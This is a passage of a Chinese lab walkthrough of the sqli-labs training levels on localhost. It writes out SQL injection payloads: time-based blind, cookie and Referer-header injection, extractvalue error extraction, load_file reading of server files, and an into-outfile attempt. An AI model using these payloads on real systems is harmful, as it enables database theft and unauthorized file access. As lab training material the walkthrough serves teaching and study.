src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623249587368-f6ee8bbe-4714-4059-aafd-5a2d22b4f48f.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=NI5dB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.39.32.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=984806&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-09 下午10.39.32.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;依此类推判断其他字符即可&lt;br &#x2F;&gt;使用burpsuite爆破&lt;br &#x2F;&gt;抓包，设置变量&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623250203802-f21235ee-4db8-4568-ba02-e3825f78fede.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=DTfyq&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.07.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=491805&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-09 下午10.49.07.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;设置payload&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623250224114-8637a251-a504-49ed-9577-bfa9130c2ea8.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=C9ahB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.15.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=437522&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-09 下午10.49.15.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;爆破后，按照包长排序，得到101&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623250278410-b6677f14-ede8-4120-915c-89641c635422.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1312&amp;amp;id=v2XbG&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8810.49.32.png&amp;amp;originHeight=1312&amp;amp;originWidth=1816&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=374129&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=1816&quot; alt=&quot;截屏2021-06-09 下午10.49.32.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;依此类推即可&lt;br &#x2F;&gt;或者使用双字典爆破，一次性获取所有&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623251011189-93a3c8f8-fa33-42e3-a1e5-d455678a9303.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1312&amp;amp;id=QSq0b&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-09%20%E4%B8%8B%E5%8D%8811.03.14.png&amp;amp;originHeight=1312&amp;amp;originWidth=1816&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=381768&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=1816&quot; alt=&quot;截屏2021-06-09 下午11.03.14.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;shi-jian-mang-zhu&quot;&gt;时间盲注&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623258339277-0ac1f8c4-3475-4391-83b1-f1c26e9b3536.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=dzobv&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.05.08.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=887958&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 上午1.05.08.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;利用sleep()函数的延时作用，来判断正误&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-9&#x2F;?id=1&#x27; or if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101,sleep(0.1),0) %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623258302302-65dbc5ce-4f61-49b9-b80d-ba2fc7d9b319.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=DlOAz&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.04.30.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=989970&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 上午1.04.30.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;依此类推&lt;&#x2F;p&gt;
&lt;h2 id=&quot;cookiezhu-ru&quot;&gt;cookie注入&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623258516193-540c8aa0-ffb5-4868-aa72-9f1b6fb2974e.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=lOZMm&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.08.06.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=944597&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 上午1.08.06.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入admin&#x2F;admin登陆，获取cookie&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623258687489-67f803f2-2159-4e1c-902f-ea56a3035770.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=TDkZ7&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.10.18.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1062092&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 上午1.10.18.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;打开burpsuite抓包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623258837129-5040c3a8-bae5-45fd-9dee-b1c90ca1b35b.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=eBhv7&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.13.20.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=492319&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午1.13.20.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在burp中进行改包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623259056589-6beb203b-231e-4727-a395-b1279673e1d7.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=VhStB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.17.04.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=566425&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午1.17.04.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;判断出后台为单引号注入&lt;br &#x2F;&gt;order by 判断出为3列后，进行联合查询，判断出数据显示的位置&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623259476559-cb938133-d3a5-4555-877d-3c541e1be2e1.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=o5I13&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.24.00.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=745156&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午1.24.00.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623259502452-7f7381e7-b256-4276-90d4-5b6c50051b21.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=170&amp;amp;id=tdItO&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.24.48.png&amp;amp;originHeight=170&amp;amp;originWidth=532&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=30188&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=532&quot; alt=&quot;截屏2021-06-10 上午1.24.48.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;cookie的值为&lt;br &#x2F;&gt;Cookie: uname=admin&#x27; and 0 union select 99,group_concat(table_name),77 from information_schema.tables where table_schema=database() %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623260064290-ecafa471-bc88-48b6-a6fc-120d39eceaa3.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=yyOj5&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.33.30.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=751191&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午1.33.30.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;从而得到当前数据库中的所有表&lt;br &#x2F;&gt;剩余同上&lt;&#x2F;p&gt;
&lt;h2 id=&quot;http-refererzhu-ru&quot;&gt;HTTP-Referer注入&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623260502648-dc12228f-99e1-4267-b045-bf182953be2a.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1666&amp;amp;id=CcibJ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.41.25.png&amp;amp;originHeight=1666&amp;amp;originWidth=2536&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=314805&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2536&quot; alt=&quot;截屏2021-06-10 上午1.41.25.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入admin&#x2F;admin进行登陆&lt;br &#x2F;&gt;登陆后发现页面返回referer，猜测referer存在注入&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623260607589-ab269e00-20fe-4d26-9606-9f4ce345854c.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1666&amp;amp;id=cbT1S&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.42.18.png&amp;amp;originHeight=1666&amp;amp;originWidth=2536&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=830279&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2536&quot; alt=&quot;截屏2021-06-10 上午1.42.18.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;进行burp抓包&lt;br &#x2F;&gt;在referer后加入 &#x27;&amp;quot; 依此判断注入类型&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623260964397-93acdbfb-86c9-4785-9e7d-3c44a7ca2756.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=h98rR&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%881.48.10.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=676834&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午1.48.10.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;报错中出现逗号，考虑为insert注入&lt;br &#x2F;&gt;insert的语法格式为&lt;br &#x2F;&gt;insert into users values(&#x27;16&#x27;,&#x27;lcamry&#x27;,&#x27;lcamry&#x27;);&lt;br &#x2F;&gt;所以注入时应输入 &#x27; and &#x27; 来闭合前后的单引号&lt;br &#x2F;&gt;Referer: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-19&#x2F;&#x27; and &#x27;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623262702648-59349a7d-2866-4b1e-ac9f-d44772abb5ed.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=Jbk5V&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.17.30.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=650734&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午2.17.30.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可见并没有报错&lt;br &#x2F;&gt;之后进行注入&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;Referer: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-19&#x2F;&#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &#x27;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623262884112-5904457c-999c-4246-9019-dd2a884dfc72.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=rbAO3&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.20.54.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=645946&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午2.20.54.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询数据表名&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;Referer: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-19&#x2F;&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623263084896-eba9b5e6-4e23-437c-862d-9d696ee240ae.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=JvEz5&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8A%E5%8D%882.24.02.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=653019&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-10 上午2.24.02.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;剩余同上&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sqlzhu-ru-du-xie-wen-jian&quot;&gt;SQL注入读写文件&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;loadfile(file_name)&lt;&#x2F;strong&gt;:读取文件并返回文件的内容作为一个字符串。使用条件：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;必须有权限读取并且文件必须完全可读&lt;&#x2F;li&gt;
&lt;li&gt;欲读取文件必须在服务器上&lt;&#x2F;li&gt;
&lt;li&gt;必须指定文件完整的路径&lt;&#x2F;li&gt;
&lt;li&gt;欲读取文件必须小于 max_allowed_packet&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;wen-jian-du-qu&quot;&gt;文件读取&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623338818458-e0b289bd-d7a0-4f86-8e3d-6df5e041c5a5.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=Up9Jl&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8B%E5%8D%8811.26.43.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=595390&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 下午11.26.43.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;猜测本题的网站源码放置在如下目录&lt;br &#x2F;&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-1&lt;br &#x2F;&gt;利用load_file函数，URL处输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-1&#x2F;?id=-1&#x27; union select 1,2,hex(load_file(&amp;quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-1&#x2F;index.php&amp;quot;)) %23&lt;br &#x2F;&gt;获取index.php的16进制编码形式&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623340863707-1dd74c49-458d-429b-b29d-52b2b69b0b2a.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=l1cHB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-10%20%E4%B8%8B%E5%8D%8811.59.57.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=730651&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-10 下午11.59.57.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在burp中进行解码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623341012601-7a5c4b58-4853-43f3-a76c-32b0fb111803.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1750&amp;amp;id=eHSEG&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.03.16.png&amp;amp;originHeight=1750&amp;amp;originWidth=2696&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=386903&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-11 上午12.03.16.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;wen-jian-xie-ru&quot;&gt;文件写入&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;into outfile &amp;quot;绝对路径&amp;quot;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623341214228-5c33091d-973e-4518-aeb8-32f36e0b92c3.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=wIjHU&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.06.39.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=873505&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-11 上午12.06.39.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;尝试文件写入，输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-7&#x2F;?id=1&#x27;)) union select 1,2,3 into outfile &amp;quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-1&#x2F;baz.txt&amp;quot; %23&lt;br &#x2F;&gt;文件无法写入，猜测为Linux权限问题，暂时放弃……&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqlzhu-ru-rao-guo-ji-qiao&quot;&gt;SQL注入绕过技巧&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;rao-guo-zhu-shi-fu-guo-lu&quot;&gt;绕过注释符过滤&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623343019236-08f9d8be-885a-40d1-b515-ba279793b126.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=t5cF0&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.34.49.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=888704&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-11 上午12.34.49.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-23&#x2F;?id=1&#x27; a%23b&lt;br &#x2F;&gt;发现结果中ab紧挨在一起，判断系统将注释符过滤掉了&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623343310342-e001f341-1a96-4862-aaa2-79c6a42feec6.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=TaHhX&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.41.29.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=976528&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-11 上午12.41.29.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623343318588-5219adf9-0c9f-46bf-affd-80ee3c8c4769.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=186&amp;amp;id=biyQQ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-11%20%E4%B8%8A%E5%8D%8812.41.36.png&amp;amp;originHeight=186&amp;amp;originWidth=382&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=9444&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=382&quot; alt=&quot;截屏2021-06-11 上午12.41.36.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;--+注释同理也被过滤&lt;br &#x2F;&gt;此处sql 语句为&lt;br &#x2F;&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&amp;quot;;&lt;br 